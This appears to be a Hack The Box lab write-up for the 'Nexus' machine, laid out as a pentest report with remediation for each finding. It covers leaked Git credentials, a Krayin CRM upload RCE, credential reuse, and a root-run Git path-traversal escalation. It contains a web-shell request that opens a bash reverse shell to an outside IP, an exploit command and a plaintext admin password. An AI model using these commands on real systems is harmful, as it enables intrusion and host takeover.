# 🎯 Machine Information


---
# 📋 General Information

| Field               | Value       |
| ------------------- | ----------- |
| 🖥️ Machine         | Nexus       |
| 🌍 Platform         | HTB         |
| 💻 Operating System | Linux       |
| 🎯 Difficulty       | Easy        |
| 📅 Date Started     | 29/Jul/2026 |
| 📅 Date Finished    | 01/Ago/2026 |
| 👤 Author           | 7u9y        |

---
# 📄 Executive Summary

> Between **29 July 2026 and 1 August 2026**, a **black-box penetration test** was conducted against the **Nexus** environment, including the exposed web applications **Gitea** and **Krayin CRM**, with the objective of identifying vulnerabilities that could allow unauthorized access, privilege escalation, or full system compromise.
>
> **Overall Risk Rating: 🔴 Critical**
> Given the ease of exploitation, the chaining of multiple weaknesses, and the successful achievement of full administrative control of the target host, the overall risk to the Nexus environment is assessed as **Critical**.
>
> The compromise began with a **Sensitive Information Disclosure** vulnerability in the Gitea repository history, where valid credentials were exposed through a committed `.env` file. The disclosed credentials granted administrative access to the Krayin CRM application.
>
> Using the authenticated CRM session, **CVE-2026-38526 (Authenticated Remote Code Execution)** was successfully exploited, resulting in remote command execution and an interactive shell as the `www-data` user.
>
> Subsequent local enumeration identified additional credentials stored in a server-side `.env` file, allowing SSH access as the `jones` user.
>
> The final privilege escalation was achieved through a **directory traversal vulnerability in a root-executed Gitea template synchronization service**. By crafting malicious Git tree and commit objects that bypassed Git’s built-in path validation, arbitrary files could be written outside the intended staging directory. This technique was used to inject an attacker-controlled SSH public key into `/root/.ssh/key`, leading to **full root compromise** of the target system.
>
> The attack chain demonstrated that weaknesses in **repository hygiene, credential management, application security, and privileged automation components** could be combined to achieve **persistent administrative control of the host**.
>
> From a business perspective, successful exploitation would allow an attacker to execute arbitrary code, access sensitive application and system data, maintain persistent privileged access, and fully compromise the **confidentiality, integrity, and availability** of the affected environment.
>
> **Immediate remediation is strongly recommended**, with priority given to removing exposed credentials from version control, rotating all affected secrets and passwords, updating the vulnerable Krayin CRM instance, and redesigning the privileged template synchronization mechanism to prevent path traversal and arbitrary file write conditions.

###   🔗 Attack Chain

---
![](assets/Web%20Access%20and%20Privilege-2026-08-15-184227.png)
---

# 🌐 Attack Surface
 
## 🛰️ Open Services

| IP            | Port | Service | Tec     | Version |
| ------------- | ---- | ------- | ------- | ------- |
| 10.129.70.151 |      |         |         |         |
|               | 22   | ssh     | OpenSSH | 9.6     |
|               | 80   | http    | nginx   | 1.24.0  |

---
## 🌍 Domains

| 🖥️ IP        | 🌐 Domain | 🌍 Subdomain        | 📍 Status / Notes |
| :------------ | :-------- | :------------------ | :---------------- |
| 10.129.70.151 | nexus.htb |                     |                   |
|               |           | ↳ git.nexus.htb     | 200               |
|               |           | ↳ billing.nexus.htb | 200               |


---

## ⚙️ Technologies

| Domain / IP               | Technology                           | Version | Notes                                                               |
| ------------------------- | ------------------------------------ | ------- | ------------------------------------------------------------------- |
| http://nexus.htb/         | nginx                                | 1.24.0  | It's a page information , It Doesn't have no technology interactive |
| http://git.nexus.htb/     | gitea                                | 1.26.0  |                                                                     |
| http://billing.nexus.htb/ | Krayin (Laravel 12.54.1 , PHP 8.3.6) | v2.2.x  |                                                                     |

---

# 🔍 Reconnaissance

## Enumeration Commands

```bash
nmap -p22,80 -sCV -oN Targeted 10.129.70.151
```

---

## Raw Output

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://nexus.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Jul 29 21:21:56 2026 -- 1 IP address (1 host up) scanned in 10.56 seconds

```

---

## Analysis

>Scan against **10.129.70.151** revealed a minimal attack surface — only SSH and HTTP exposed.
>
>- **SSH (22/tcp)** — OpenSSH 9.6p1 (Ubuntu). No known exploits, no credentials yet → deprioritized until valid creds were found.
>- **HTTP (80/tcp)** — nginx 1.24.0. Redirected to `nexus.htb`, indicating name-based virtual hosting. Added to `/etc/hosts` and enumerated via vhost brute-forcing, revealing two additional subdomains: **git.nexus.htb** and **billing.nexus.htb**.
>
>The narrow network surface but wide application surface (Gitea + Krayin CRM) shifted the assessment focus toward **web application and virtual host enumeration**.

---
## Evidence

📷 Screenshot
![](assets/Pasted%20image%2020260801215805.png)

---

# 🚨 Findings

## 🟣 WEB-001 —  Authenticated Remote Code Execution (CVE-2026-38526)

### 📋 Finding Metadata

| Field         | Value                                                     |
| ------------- | --------------------------------------------------------- |
| Finding ID    | WEB-001                                                   |
| Severity      | 🟣 CRITICAL                                               |
| Status        | Confirmed                                                 |
| Domain        | billing.nexus.htb                                         |
| Endpoint      | /admin/tinymce/upload                                     |
| IP            | 10.129.73.51                                              |
| Service       | Krayin                                                    |
| Version       | 2.2.0                                                     |
| Vulnerability | Authenticated RCE                                         |
| CVE           | 2026-38526                                                |
| CWE           | CWE-434 (Unrestricted Upload of File with Dangerous Type) |
| OWASP         | A03:2021 Injection                                        |
| CVSS          | CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H              |
| Score         | 10.0                                                      |

---

### 📝 Description

>An authenticated remote code execution vulnerability was identified in **Krayin CRM v2.2.0** affecting the TinyMCE file upload functionality exposed through the `/admin/tinymce/upload` endpoint. The vulnerability allows an authenticated user with access to the administrative interface to upload a malicious PHP file that is stored within a web-accessible directory and subsequently executed by the PHP interpreter. The issue exists because the application does not adequately validate or restrict the type of files that can be uploaded through the TinyMCE component. The affected component is the **Krayin TinyMCE upload handler**. Successful exploitation enables an attacker to upload and execute arbitrary PHP code on the underlying Linux server with the privileges of the web application user. In this assessment, the vulnerability was exploited by uploading a PHP web shell, resulting in remote command execution and interactive access to the target system.
---
### ⚠️ Risk

Successful exploitation allows an attacker to: 

- Upload arbitrary PHP files. 
- Execute commands on the underlying server. 
- Access application and system files. 
- Extract credentials and sensitive data. 
- Establish a persistent web shell. 
- Pivot to additional local privilege escalation vectors. 
- Fully compromise the affected host when chained with other vulnerabilities.

---
### 🔎 Discovery

#### Command

```bash
sudo searchsploit krayin
```
#### Output

```text
------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                          |  Path
------------------------------------------------------------------------ ---------------------------------
Krayin CRM v2.2.x - Authenticated Remote Code Execution                 | multiple/webapps/52629.py
------------------------------------------------------------------------ ---------------------------------
```
#### Analysis

> After obtaining administrative access to the Krayin CRM application through the credential disclosure issue described in WEB-002, the application version was reviewed and identified as **v2.2.0**. Because the deployed version appeared outdated, the latest publicly available Krayin release was checked and found to be **v2.2.4**. The version gap suggested that known vulnerabilities might affect the target installation. Public vulnerability research identified **CVE-2026-38526**, an authenticated remote code execution vulnerability affecting Krayin 2.2.x through the TinyMCE upload functionality. The target application satisfied all exploitation prerequisites, including: 
> 
- Valid administrative credentials. 
- Access to the TinyMCE upload feature. 
 - Ability to upload files through `/admin/tinymce/upload`.

 >The possibility of uploading a server-side executable file (PHP) was considered particularly significant because it would provide direct code execution on the target host. The public exploit referenced during validation is provided in Appendix A.
---
#### Evidence

📷 Screenshot
![](assets/Pasted%20image%2020260801172847.png)
---

### 🧠 Technical Analysis

>The assessment focused on determining whether the TinyMCE upload handler properly enforced file-type restrictions and prevented executable content from being uploaded. Version verification confirmed that the application was running **Krayin CRM v2.2.0**, a version affected by **CVE-2026-38526**. Publicly available exploit information indicated that the upload endpoint could accept files with a `.php` extension when the request was performed by an authenticated administrator. A malicious PHP file was uploaded through the vulnerable endpoint. The uploaded file was stored in a location accessible through the web server, allowing the PHP interpreter to execute its contents. This behavior confirmed that the vulnerability was caused by **insufficient validation of uploaded files and unsafe handling of user-controlled content within a web-accessible directory**. The issue resulted in arbitrary command execution with the privileges of the web application user (`www-data`).
---
### 💥 Exploitation
#### Payload

```bash
python3 Poc_Krayin2.2.0.py -t 'http://billing.nexus.htb/' -u 'j.matthew@nexus.htb' -p '<Password>' -f wshell.php
```

The PHP web shell used during exploitation (`wshell.php`) is included in Appendix B — Exploitation Artifacts for technical reference and reproducibility.

---
#### Expected Result

>The application should reject uploads of executable file types such as `.php`, regardless of the user’s privilege level. Uploaded files should be validated using a strict allowlist of permitted extensions and MIME types, stored outside the web root, and served as static content without server-side execution. Attempts to upload a PHP web shell should fail and no executable file should become accessible through the web server.
>
#### Actual Result

>The application accepted the upload of a malicious PHP file through the `/admin/tinymce/upload` endpoint. The file was stored in a web-accessible directory and could be executed directly through the browser. By accessing the uploaded file, arbitrary operating-system commands were executed on the server, resulting in remote code execution as the `www-data` user and providing interactive access to the target system.
---
#### Evidence
📷 Screenshot
![](assets/Pasted%20image%2020260801173835.png)

---
## 🎯 Impact

An authenticated attacker with administrative access to Krayin CRM was able to achieve **remote code execution on the underlying Linux host**. 

Successful exploitation resulted in: 
- Upload and execution of a PHP web shell. 
- Arbitrary command execution as `www-data`. 
- Access to application and system files.
- Extraction of additional credentials from the server. 
- Establishment of a stable foothold on the host.
- Facilitation of subsequent privilege escalation to higher-privileged users and ultimately to root.

This vulnerability served as the **initial operating-system level compromise** of the target environment.

---
### 🔧 Remediation

To remediate this vulnerability: 

- Upgrade Krayin CRM to a version that addresses **CVE-2026-38526**.
- Disable or restrict the TinyMCE upload functionality if not required.
- Enforce a strict allowlist of permitted file extensions. 
- Validate both file extension and MIME type on the server side. 
- Store uploaded files outside the web root. 
- Configure the web server to prevent execution of uploaded files.
- Implement antivirus and content-scanning controls for uploaded files.
- Review and remove any unauthorized files previously uploaded to the server.
- Monitor upload directories for executable content.
---

### 📚 References

-  CVE-2026-38526
- CWE-434: Unrestricted Upload of File with Dangerous Type
- OWASP Top 10 2021 – A03: Injection
- Exploit-DB / Searchsploit entry for Krayin CRM 2.2.x Authenticated Remote Code Execution


---
## 🔴 WEB-002 — Sensitive Information Disclosure (CVE-XXXX-XXXX)

### 📋 Finding Metadata

| Field         | Value                                                      |
| ------------- | ---------------------------------------------------------- |
| Finding ID    | WEB-002                                                    |
| Severity      | 🔴 HIGH                                                    |
| Status        | Confirmed                                                  |
| Domain        | git.nexus.htb                                              |
| Endpoint      | /admin/krayin-docker-setup/commits/branch/main             |
| IP            | 10.129.73.51                                               |
| Service       | Gitea                                                      |
| Version       | 1.26.0                                                     |
| Vulnerability | Information Disclosure                                     |
| CVE           | XXXX-XXXX                                                  |
| CWE           | CWE-200/540                                                |
| OWASP         | CWE-540: Inclusion of Sensitive Information in Source Code |
| CVSS          | CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N               |
| Score         | 7.5                                                        |

---

### 📝 Description

>A sensitive information disclosure vulnerability was identified in the publicly accessible Gitea repository `krayin-docker-setup`. Historical commits exposed a committed `.env` file containing valid administrative credentials for the Krayin CRM application.
   The issue was caused by sensitive configuration data being committed to version control and remaining accessible through the repository history. An unauthenticated attacker with access to the repository could review previous revisions and recover credentials that should never be stored in source control.
   Successful exploitation allowed unauthorized access to the Krayin CRM administrative interface and provided the initial foothold used for further compromise of the target environment.

---

### ⚠️ Risk

Successful exploitation allows an attacker to:

- Extract valid application credentials.
- Obtain unauthorized administrative access to the CRM. 
- Access sensitive business and customer data. 
- Modify application content and configuration. 
- Abuse authenticated functionality for further exploitation. 
- Chain the issue with additional vulnerabilities, including remote code execution and privilege escalation.

---

### 🔎 Discovery

#### Command

```bash
git clone http://git.nexus.htb/admin/krayin-docker-setup
cd krayin-docker-setup
tig --all
```

#### Output

```text
2026-04-23 18:05 +0000 admin o [main] {origin/main} {origin/HEAD} Upload files to "/"     
2026-04-23 18:03 +0000 admin I Upload files to "/"  
```

#### Analysis

>The repository was considered particularly interesting because its commit history was publicly accessible and contained configuration-related artifacts. Since `.env` files commonly store database credentials, API tokens, and administrative passwords, the history was enumerated using `tig --all`.Reviewing previous commits revealed that an earlier revision contained a `.env` file with exposed credentials. The recovered credentials were then tested against the Krayin CRM administrative interface, resulting in successful authentication and confirming that the disclosure was security-relevant.

---

#### Evidence

📷 Screenshot :
![](assets/Pasted%20image%2020260801125554.png)

---

### 🧠 Technical Analysis

>Git preserves historical revisions even when files are later removed from the current working tree. As a result, secrets committed in previous revisions may remain accessible through the repository history.
   In this case, a historical commit contained a `.env` file with valid administrative credentials. Because the repository and its commit history were publicly accessible, the credentials could be recovered without authentication and reused to access the Krayin CRM administrative panel.
   The root cause was insecure secret management combined with public exposure of repository history containing sensitive configuration data.

---

### 💥 Exploitation

#### Payload

```bash
POST /admin/login HTTP/1.1

Host: billing.nexus.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:153.0) Gecko/20100101 Firefox/153.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded

_token=kTvv5u61NiWAGUeI6LTLb7Giyz5WfCoRtAOx15vq&email=j.matthew@nexus.htb&password=<Password>
```
---
#### Expected Result

> Sensitive credentials should not be present in Git repositories or their historical commits. Repository history containing secrets should be rewritten or removed, and access to sensitive repositories should be restricted to authorized users. If exposed credentials are discovered, they should be immediately rotated and invalidated. Authentication to the administrative panel using previously exposed credentials should fail because the credentials should no longer be valid or additional security controls, such as multi-factor authentication, should prevent unauthorized access.
---
#### Actual Result

>Historical commits in the Gitea repository exposed a `.env` file containing valid administrative credentials. The disclosed username and password were successfully used to authenticate to the Krayin CRM administrative interface without any additional verification. The application granted full administrative access, confirming that the exposed credentials were valid, reusable, and directly exploitable.
---
#### Evidence

📷 Screenshot
![](assets/Pasted%20image%2020260801165441.png)

---

## 🎯 Impact

> An unauthenticated attacker was able to extract valid administrative credentials from the exposed Git commit history and obtain unauthorized access to the Krayin CRM application.

Successful exploitation resulted in: 

- Credential disclosure. 
- Unauthorized administrative access. 
- Access to authenticated CRM functionality. 
- Ability to leverage additional vulnerabilities requiring authentication. 
- Facilitation of subsequent remote code execution and privilege escalation attacks.

This issue served as the initial foothold that enabled the complete compromise of the target environment.`

---
### 🔧 Remediation

To remediate this vulnerability:

- Remove all secrets from the Git repository history using a history
- -rewriting tool such as `git filter-repo` or BFG Repo-Cleaner. 
- Rotate all credentials, API keys, and tokens that were exposed. 
- Store secrets in a dedicated secret-management solution rather than in source code or `.env` files committed to Git. 
- Restrict access to repositories containing sensitive deployment or configuration data. 
- Implement pre-commit and server-side secret scanning to prevent future secret exposure. 
- Enable multi-factor authentication for administrative accounts. 
- Regularly audit repository history for accidental credential disclosure.

---

### 📚 References

- CWE-200: Exposure of Sensitive Information to an Unauthorized Actor
- CWE-798: Use of Hard-coded Credentials
- OWASP Top 10 2021 – A02: Cryptographic Failures 
- OWASP Top 10 2021 – A05: Security Misconfiguration
---

## 🟠 WEB-003 — Laravel Debug Mode Enabled in Production

### 📋 Finding Metadata

| Field         | Value                                                   |
| ------------- | ------------------------------------------------------- |
| Finding ID    | WEB-003                                                 |
| Severity      | 🟠 MEDIUM                                               |
| Status        | Confirmed                                               |
| Domain        | billing.nexus.htb                                       |
| Endpoint      | /_ignition/execute-solution                             |
| IP            | 10.129.73.51                                            |
| Service       | Krayin / Laravel                                        |
| Version       | Laravel 12.54.0 / PHP 8.3.6                             |
| Vulnerability | Security Misconfiguration                               |
| CVE           | Not Applicable                                          |
| CWE           | CWE-489 / CWE-215                                       |
| OWASP         | A05:2021 – Security Misconfiguration                    |
| CVSS          | CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N            |
| Score         | 5.3                                                     |

---

### 📝 Description

>A security misconfiguration was identified in the production Laravel application. The application was running with `APP_DEBUG=true`, and the Laravel Ignition debugging interface was publicly accessible through the endpoint `/_ignition/execute-solution`.
>
>The deployment configuration stored in the Gitea repository explicitly enabled debug mode:
>
>```yaml
>APP_DEBUG: "true"
>```
>
>The exposed endpoint confirmed that debugging functionality was active in the production environment. Although the known **CVE-2021-3129** affecting older Laravel Ignition versions was reviewed, the target application is running **Laravel 12.54.0**, and no evidence was found that this specific remote code execution vulnerability is applicable to the tested version.
>
>Exposing debug functionality in production increases the attack surface and may disclose internal application information useful for further attacks.

---

### ⚠️ Risk

Successful exploitation may allow an attacker to:

- Obtain detailed framework and environment information.
- Identify internal application paths and components.
- Enumerate installed packages and versions.
- Gather information useful for vulnerability research.
- Increase the effectiveness of subsequent exploitation attempts.
- Chain the issue with additional vulnerabilities present in the application.

---

### 🔎 Discovery

#### Command

```bash
curl -i -X POST 'http://billing.nexus.htb/_ignition/execute-solution' -H 'Content-Type: application/json' 
```

#### Output

```text
HTTP/1.1 302 Found
```

#### Analysis

>The deployment repository was reviewed during the assessment, and the Docker configuration revealed that the application was configured with `APP_DEBUG=true`.
>
>Direct access to the `/_ignition/execute-solution` endpoint returned a successful HTTP response, confirming that Laravel Ignition debugging functionality was exposed to unauthenticated users.
>
>The target version was compared against publicly known Laravel Ignition vulnerabilities. While **CVE-2021-3129** was considered, the tested version (**Laravel 12.54.0 / PHP 8.3.6**) is not known to be affected by that specific issue. The finding was therefore classified as a **security misconfiguration rather than a confirmed remote code execution vulnerability**.

---
#### Evidence
📷 Screenshot:

![](assets/Pasted%20image%2020260804211927.png)

---

### 🧠 Technical Analysis

>Laravel disables detailed exception handling and debugging features when `APP_DEBUG=false`. When enabled, the framework may expose diagnostic information intended only for development environments.
>
>In this case, the Ignition debugging component was accessible from the production environment. Although no active exploitation of the endpoint was performed during the assessment, the exposure provides valuable reconnaissance information that could assist an attacker in identifying framework versions, internal paths, installed packages, and other implementation details.
>
>The root cause was **insecure deployment configuration**, where development debugging settings were enabled in a production environment.

---

### 💥 Exploitation

#### Payload

```http
GET /_ignition/execute-solution HTTP/1.1
Host: billing.nexus.htb
```

---

#### Expected Result

>Debugging interfaces should not be accessible in production environments. Requests to `/_ignition/*` should return **404 Not Found**, **403 Forbidden**, or be otherwise inaccessible to unauthenticated users. Production deployments should operate with `APP_DEBUG=false`.

---

#### Actual Result

>The `/_ignition/execute-solution` endpoint was publicly accessible, confirming that Laravel Ignition debugging functionality was enabled in the production environment. No remote code execution was confirmed from this endpoint during the assessment.

---

#### Evidence

📷 Screenshot:

![](assets/Pasted%20image%2020260804212017.png)

---

## 🎯 Impact

>An unauthenticated attacker can access Laravel debugging functionality and obtain internal application information that should not be exposed in a production environment.

Successful exploitation may result in:

- Framework fingerprinting.
- Internal path disclosure.
- Package and component enumeration.
- Improved targeting of additional vulnerabilities.
- Increased likelihood of successful attack chaining.

No direct remote code execution was confirmed from this issue during the assessment.

---

### 🔧 Remediation

To remediate this vulnerability:

- Set `APP_DEBUG=false` in all production environments.
- Ensure `APP_ENV=production`.
- Disable or restrict access to Laravel Ignition in production.
- Review Docker and deployment manifests for development settings.
- Implement environment-specific configuration management.
- Validate production security settings during the deployment process.
- Prevent sensitive configuration files from being exposed through source control.

After remediation, verify that requests to `/_ignition/*` are no longer accessible from untrusted networks.

---

### 📚 References

- https://laravel.com/docs/12.x/configuration#debug-mode
- https://flareapp.io/docs/ignition/introducing-ignition
- https://cwe.mitre.org/data/definitions/489.html
- https://owasp.org/Top10/A05_2021-Security_Misconfiguration/

---
# 🔐 Credentials

| Username            | Password      | Source                          | Privilege     | Valid |
| ------------------- | ------------- | ------------------------------- | ------------- | ----- |
| j.matthew@nexus.htb | N27xh!!2ucY04 | Exposed in Gitea commit history | Administrator | Yes   |

---

# 🚪 Initial Access

## Method

>A reverse shell was established through the uploaded web shell, resulting in interactive command execution as `www-data`.

---

## Commands

```bash
http://billing.nexus.htb/storage/tinymce/441edcef521f4a77059346578bac3db5.php?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.239%2F4444%200%3E%261%27
```

---

## Session Information

| Field   | Value             |
| ------- | ----------------- |
| User    | www-data          |
| Shell   | /usr/bin/bash     |
| Service | HTTP (Krayin CRM) |
| Port    | 4444              |

---

# ⬆️ Privilege Escalation

## 🟣LPE-001 - Gitea Template Path Traversal

### 📋 Finding Metadata

| Field          | Value                                          |
| -------------- | ---------------------------------------------- |
| Finding ID     | LPE-001                                        |
| Severity       | 🟣 Critical                                    |
| Status         | Confirmed                                      |
| Host           | nexus.htb                                      |
| Source Context | jones                                          |
| Target Context | root                                           |
| Component      | Gitea Template Synchronization                 |
| Target         | gitea-template-sync.service / template-sync.py |
| Vulnerability  | Directory Traversal / Arbitrary File Write     |
| CVE            | N/A                                            |
| CWE            | CWE-22 / CWE-73                                |
| OWASP          | A05:2021 Security Misconfiguration             |
| CVSS           | CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H   |
### 📝 Description

>After obtaining access as the `jones` user, a privileged automation process was identified through systemd timer enumeration. The escalation was achieved by exploiting a directory traversal vulnerability in the root-executed Gitea template synchronization mechanism. The service processed files from user-controlled template repositories and wrote them to disk without properly validating repository-controlled paths. By crafting malicious Git tree objects that bypassed Git’s built-in path validation, it was possible to write arbitrary files outside the intended staging directory. This technique was used to inject an attacker-controlled SSH public key into `/root/.ssh/key`, resulting in full root compromise of the target host.
### 🕵️‍♂️ Enumeration

```bash
systemctl list-timers --all
systemctl cat gitea-template-sync.service
```
### 📜Result
#### Evidence
📷 Screenshot
![](assets/Pasted%20image%2020260801184538.png)

---

### 🔬Analysis

>After obtaining access as the `jones` user, systemd timer enumeration identified the `gitea-template-sync.service` service executing the Python script `template-sync.py` with root privileges. The source code of `template-sync.py` is provided in Appendix C.

Review of the script revealed that file paths extracted from Gitea template repositories were concatenated directly with the destination staging path using `os.path.join(stage_path, filepath)` and then written to disk without path normalization or traversal validation.

The relevant code section was:

`target = os.path.join(stage_path, filepath) with open(target, 'wb') as f: f.write(cat_result.stdout)`

Because `filepath` originated from repository-controlled Git tree entries, the synchronization process trusted paths contained in Git objects. Although Git normally prevents directory traversal sequences such as `../` from being created through standard Git commands, the validation can be bypassed by manually crafting raw Git tree and commit objects.

Since the synchronization service processed these objects as root, a malicious repository could write files outside the intended staging directory. This behavior enabled an arbitrary file write to `/root/.ssh/key`, resulting in full administrative access to the target system.

---
### 💥 Exploitation

>An SSH key pair was generated on the attacker system to prepare privileged access.

```bash
cd /tmp
ssh-keygen -f ./key -N ''
git clone http://jones:'<password>'@localhost:3000/jones/PrivEx.git
python3 PayloadPrivs.py
```

>A new Gitea repository named `PrivEx` was created and configured as a template repository. A custom Python payload named `PayloadPrivs.py` was then used to generate malicious Git tree and commit objects containing directory traversal entries targeting `/root/.ssh/key`.
>
>The payload bypassed Git's native path validation and was pushed to the Gitea server, where it was later processed by the root-executed synchronization service.

>The full source code of `PayloadPrivs.py` is provided in Appendix D.

>When the `gitea-template-sync.service` timer executed, the repository was synchronized by `template-sync.py` running as `root`. During this process, the attacker-controlled public key was written to `/root/.ssh/key`

 Administrative access was then obtained using the corresponding private key:

```bash
ssh -i key root@10.129.73.51
```
---

### 📜 Result

>Successful SSH authentication was achieved as `root`, confirming arbitrary file write through crafted Git objects processed by the vulnerable synchronization service.

#### Evidence
📷 Screenshot
![](assets/Pasted%20image%2020260801185246.png)

### 🎯Impact

>A low-privileged user with the ability to create or modify Gitea template repositories was able to exploit a directory traversal vulnerability in a root-executed synchronization service. By manually crafting Git tree objects that bypassed Git’s built-in path validation, the attacker achieved an arbitrary file write to `/root/.ssh/key` and obtained full administrative control of the target system.


### 🔧 Remediation

To remediate this privilege escalation vulnerability, the following actions are recommended: 

- Validate and normalize all repository-controlled file paths before writing them to disk, and reject any path containing traversal sequences such as `..`. 
- Use canonical path validation (for example, `os.path.realpath`) and verify that the final destination remains within the intended staging directory. 
- Execute the synchronization service with a dedicated low-privileged account instead of `root`, following the principle of least privilege. 
- Restrict write access to sensitive directories such as `/root/.ssh/` and other privileged filesystem locations. 
- Avoid processing untrusted Git tree objects directly; use safe Git checkout mechanisms that enforce path validation. 
- Implement allowlists for permitted file paths and file types within template repositories. 
- Add integrity and security checks before synchronizing repository contents. 
- Review all existing template repositories for malicious or unexpected Git objects and remove any unauthorized content. 
- Monitor systemd services that process user-controlled data and audit them for unsafe file-handling operations.``



---
## 🔴 LPE-002 - Credential Reuse from Application .env File

### 📋 Finding Metadata

| Field          | Value                                               |
| -------------- | --------------------------------------------------- |
| Finding ID     | LPE-002                                             |
| Severity       | 🔴 High                                             |
| Status         | Confirmed                                           |
| Host           | nexus.htb                                           |
| Source Context | www-data                                            |
| Target Context | jones                                               |
| Component      | Krayin CRM Environment Configuration                |
| Target         | /var/www/krayin/.env                                |
| Vulnerability  | Credential Reuse                                    |
| CVE            | N/A                                                 |
| CWE            | CWE-798                                             |
| OWASP          | A07:2021 Identification and Authentication Failures |
| CVSS           | CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:L        |
|                |                                                     |

### 📝 Description

>After obtaining remote code execution as `www-data` through the Krayin CRM vulnerability, local privilege escalation enumeration was performed. The escalation was achieved through the discovery of additional credentials stored in a server-side `.env` file located in the application directory. The credentials differed from those previously identified in the Gitea credential disclosure issue (WEB-002). Testing the discovered password against local system accounts resulted in successful SSH authentication as the `jones` user, providing a more privileged and stable foothold on the target host.
### 🕵️‍♂️Enumeration

```bash
find / -type f -name '.env' 2>/dev/null
```
### 📜Result

```bash
/var/www/krayin/.env
```

####  Evidence

📷 Screenshot
![](assets/Pasted%20image%2020260801180634.png)

---

### 🔬 Analysis

>Following the compromise of the web application, standard local privilege escalation enumeration was conducted. This included the review of:

- SUID binaries 
- running services 
- cron jobs - Linux capabilities 
- sudo privileges (`sudo -l`) 
- writable files and scripts 
- sensitive configuration files 
 
>No immediately exploitable privilege escalation vectors were identified during the initial enumeration. Attention was then directed toward application configuration files, particularly `.env` files, which frequently contain database credentials, API tokens, and occasionally reusable system credentials. A recursive search from the filesystem root identified `/var/www/krayin/.env`. The file contained credentials that were different from those previously disclosed through the Gitea repository history. Because credential reuse between applications and operating-system accounts is a common security weakness, the discovered password was tested against the local users present on the system (`git`, `jones`, and `root`). Authentication succeeded for the `jones` account via SSH, confirming that the exposed application secret was also valid for a local system user.
---
### 💥Exploitation

```bash
 sshpass -p '<Password>' ssh jones@10.129.73.51
```

---
### 📜Result

>Successful SSH authentication was achieved as `jones`, providing an interactive SSH session and a more privileged user context for further local privilege escalation activities.

####  Evidence
📷 Screenshot
![](assets/Pasted%20image%2020260801181408.png)

### 🎯Impact

>The compromise of the `.env` file resulted in the disclosure of credentials that were reused for a local operating-system account. 

Successful exploitation allowed the attacker to:

- Escalate privileges from `www-data` to `jones` 
- obtain a stable interactive SSH session 
- access the user's home directory and files 
- continue local privilege escalation from a less restricted account 
 
This weakness demonstrates the risk of storing sensitive credentials in application configuration files and reusing them across application and operating-system accounts.


### 🔧 Remediation

To remediate this privilege escalation vector, the following actions are recommended:

- Remove unnecessary credentials from application `.env` files and ensure that only application-specific secrets are stored. 
- Rotate all credentials exposed in `/var/www/krayin/.env`, including any passwords reused across services or operating-system accounts. 
- Enforce **unique credentials per service and per user account** to prevent credential reuse between the web application and local Linux users. 
- Restrict file permissions on sensitive configuration files (for example, `640` or `600`) and ensure they are owned by the minimum required service account. 
- Prevent low-privileged web-service accounts such as `www-data` from reading configuration files that are not required for application execution.
- Implement centralized secret management or environment-specific secret injection instead of storing reusable credentials directly on the filesystem.
- Regularly audit application configuration files and local accounts for password reuse and excessive secret exposure.``

---

# 🖥️ Post Exploitation

## 👥 Users

| **User**   | **Description**         | **Access Obtained**  |
| ---------- | ----------------------- | -------------------- |
| `www-data` | Web application account | Initial foothold     |
| `jones`    | Local user account      | Privilege escalation |
| `root`     | Administrative account  | Full compromise      |

---
## 🗂️Interesting Files

| **File**                        | **Description**                      | **Security Relevance**      |
| ------------------------------- | ------------------------------------ | --------------------------- |
| `/var/www/krayin/.env`          | Krayin environment configuration     | Credential disclosure       |
| `/opt/scripts/template-sync.py` | Root-executed synchronization script | Privilege escalation vector |
| `/root/.ssh/key`                | Root SSH authorized keys             | Persistence / root access   |

---
## 🛡️Sensitive Information

>Valid application credentials were recovered from `/var/www/krayin/.env`. No additional high-value secrets, tokens, or SSH private keys were identified during the post-exploitation phase.
---
## 🕷️Persistence Opportunities

>The privilege escalation technique itself provided a persistence mechanism by adding an attacker-controlled SSH public key to `/root/.ssh/key`. No additional persistence mechanisms were installed or modified during the assessment.

---
# 📚 Lessons Learned

## ✅ What Worked

- Correlating exposed source-code artifacts with application authentication paths. 
- Validating software versions before researching public vulnerabilities. 
- Performing structured local enumeration after obtaining a low-privileged shell. 
- Reviewing privileged automation processes (systemd timers and scripts) instead of focusing only

---

## ❌ Mistakes

- Assuming that secrets removed from the current repository state are no longer exposed. 
- Treating application credentials as isolated from operating-system accounts. 
- Trusting user-controlled file paths inside privileged synchronization or backup processes. 
- Overlooking the security impact of custom automation running with root privileges.
---

## 💡 Key Takeaways

- Git history must be considered part of the attack surface. 
- Outdated application versions should always trigger vulnerability validation. 
- Credential reuse can transform a limited web compromise into broader system access. 
- Privileged automation is often a higher-value target than traditional local privilege escalation vectors. 
- Effective pentesting is not only about exploitation, but about understanding **how multiple weaknesses can be chained into a complete compromise**.

---
# 📎 Appendix 

## 📚Appendix A — Public Exploit Reference (CVE-2026-38526)

### Exploit-DB Reference

>The public exploit used as a reference during the validation of CVE-2026-38526 (Krayin CRM Authenticated Remote Code Execution) is available through Exploit-DB.

- Exploit Title: Krayin CRM v2.2.x - Authenticated Remote Code Execution
- Exploit-DB ID: 52629

